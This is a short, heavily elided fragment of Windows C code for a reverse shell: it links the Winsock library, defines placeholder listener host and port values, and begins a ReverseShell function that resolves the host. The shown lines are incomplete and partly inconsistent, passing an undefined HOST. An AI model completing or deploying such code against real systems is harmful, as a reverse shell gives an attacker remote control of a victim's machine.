...
#pragma comment(lib, "ws2_32") // It also supports x64

#define LHOST "<HOST>" // Indicate the IP of the Local Host
#define LPORT <PORT> // Indicate the PORT of the Local Host
...
void ReverseShell()
{
    ...
    struct hostent *LHOST = gethostbyname(HOST);
